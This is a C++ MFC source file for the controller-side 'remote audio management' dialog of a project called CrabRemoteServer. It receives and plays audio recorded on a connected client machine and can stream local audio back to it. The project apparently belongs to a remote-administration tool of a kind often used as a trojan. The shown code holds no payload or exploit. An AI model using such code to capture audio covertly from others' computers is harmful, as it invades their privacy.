// AudioManager.cpp: 实现文件
//

#include "pch.h"
#include "CrabRemoteServer.h"
#include "AudioManagerDlg.h"
#include "afxdialogex.h"


// CAudioManager 对话框

IMPLEMENT_DYNAMIC(CAudioManagerDlg, CDialogEx)

CAudioManagerDlg::CAudioManagerDlg(CWnd* pParent, CIocpServer*
	IocpServer, CONTEXT_OBJECT* ContextObject)
	: CDialogEx(IDD_AUDIO_MANAGER_DIALOG, pParent)
{
	m_IocpServer = IocpServer;
	m_ContextObject = ContextObject;
	m_IsLoop = TRUE;
}

CAudioManagerDlg::~CAudioManagerDlg()
{
}

void CAudioManagerDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_AUDIO_MANAGER_CHECK, m_AudioManagerCheck);
}


BEGIN_MESSAGE_MAP(CAudioManagerDlg, CDialogEx)
	ON_WM_CLOSE()
END_MESSAGE_MAP()


// CAudioManager 消息处理程序


void CAudioManagerDlg::OnClose()
{
	// TODO: 在此添加消息处理程序代码和/或调用默认值
	if (m_ContextObject != NULL)
	{
		m_ContextObject->AudioDlg = NULL;
		m_ContextObject->DlgIdentity = 0;
		CancelIo((HANDLE)m_ContextObject->clientSocket);
		closesocket(m_ContextObject->clientSocket);
	}
	CDialogEx::OnClose();
}


BOOL CAudioManagerDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	// TODO:  在此添加额外的初始化
	CString v1;
	sockaddr_in  ClientAddress;
	memset(&ClientAddress, 0, sizeof(ClientAddress));
	int ClientAddressLength = sizeof(ClientAddress);
	BOOL IsOk = getpeername(m_ContextObject->clientSocket, (SOCKADDR*)&ClientAddress, &ClientAddressLength); //得到连接的ip 
	v1.Format("\\\\%s - 远程音频管理", IsOk != INVALID_SOCKET ? inet_ntoa(ClientAddress.sin_addr) : "");
	//设置对话框标题
	SetWindowText(v1);

	//回传客户端
	BYTE IsToken = CLIENT_GO_ON;
	m_IocpServer->OnPrepareSending(m_ContextObject, &IsToken, sizeof(BYTE));

	//启动一个线程	发送咱们的声音
	m_ThreadHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ThreadProcedure, (LPVOID)this, 0, NULL);
	return TRUE;  // return TRUE unless you set the focus to a control
				  // 异常: OCX 属性页应返回 FALSE
}

DWORD WINAPI CAudioManagerDlg::ThreadProcedure(LPVOID ParameterData)
{
	CAudioManagerDlg* This = (CAudioManagerDlg*)ParameterData;
	while (This->m_IsLoop)
	{

		if (This->m_AudioManagerCheck.GetCheck() != 1)
		{
			Sleep(1);

			continue;
		}


		//主控端数据发送至客户端
		DWORD	BufferLength = 0;
		LPBYTE	BufferData = This->m_Audio.GetRecordData(&BufferLength);   //录声音声音

		if (BufferData != NULL && BufferLength > 0)
		{
			This->m_IocpServer->OnPrepareSending(This->m_ContextObject, BufferData, BufferLength); //没有消息头    //发送声音到客户端
		}
	}
	return 0;
}

void CAudioManagerDlg::OnReceiveComplete(void)
{
	if (m_ContextObject == NULL)
	{
		return;
	}

	switch (m_ContextObject->m_ReceivedBufferDataDecompressed.GetArray(0)[0])
	{
	case CLIENT_AUDIO_MANAGER_RECORD_DATA:
	{
		m_Audio.PlayRecordData(m_ContextObject->m_ReceivedBufferDataDecompressed.GetArray(1),
			m_ContextObject->m_ReceivedBufferDataDecompressed.GetArrayLength() - 1);   //播放波形数据
		break;
	}
	default:
		// 传输发生异常数据
		break;
	}
}
